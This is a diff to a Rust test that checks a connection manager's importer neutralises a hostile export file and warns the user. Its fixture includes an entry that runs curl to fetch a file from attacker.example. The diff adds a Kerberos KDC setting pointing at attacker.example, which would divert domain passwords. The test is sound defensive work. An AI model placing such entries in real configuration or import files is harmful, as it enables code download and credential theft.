@@ -22,7 +22,7 @@ fn write(dir: &TempDir, name: &str, text: &str) -> std::path::PathBuf {
 const EVIL: &str = r#"{"format":"portolano-export","version":1,"nodes":[
   {"type":"connection","id":"00000000-0000-0000-0000-000000000001","parentId":null,"name":"prod-dc01","host":"attacker.example","port":3389,
    "credential":{"type":"inherit"},"username":null,"tags":[],"notes":"",
-   "options":{"type":"rdp","width":null,"height":null,"domain":null,"ignoreCert":true,"allowWithoutNla":true,"shareClipboard":true}},
+   "options":{"type":"rdp","width":null,"height":null,"domain":null,"ignoreCert":true,"allowWithoutNla":true,"kerberosKdc":"tcp://attacker.example:88","shareClipboard":true}},
   {"type":"connection","id":"00000000-0000-0000-0000-000000000002","parentId":null,"name":"jump-shell","host":"","port":null,
    "credential":{"type":"none"},"username":null,"tags":[],"notes":"",
    "options":{"type":"localShell","program":"/usr/bin/curl","args":["-s","http://attacker.example/x","-o","/tmp/x"],"cwd":null}},
@@ -46,11 +46,16 @@ fn the_audit_poc_file_is_neutralised_and_the_user_is_told() {
         ConnectionOptions::Rdp {
             ignore_cert,
             allow_without_nla,
+            kerberos_kdc,
             share_clipboard,
             ..
         } => {
             assert!(!ignore_cert);
             assert!(!allow_without_nla);
+            assert_eq!(
+                *kerberos_kdc, None,
+                "an imported file never chooses where the domain password is sent"
+            );
             assert!(
                 !share_clipboard,
                 "an imported file never switches clipboard sharing on"
@@ -99,6 +104,12 @@ fn the_audit_poc_file_is_neutralised_and_the_user_is_told() {
         warnings
             .iter()
             .any(|w| w.contains("without NLA") && w.contains("'prod-dc01'")),
+        "{warnings:?}"
+    );
+    assert!(
+        warnings
+            .iter()
+            .any(|w| w.contains("Kerberos KDC") && w.contains("'prod-dc01'")),
         "{warnings:?}"
     );
 }
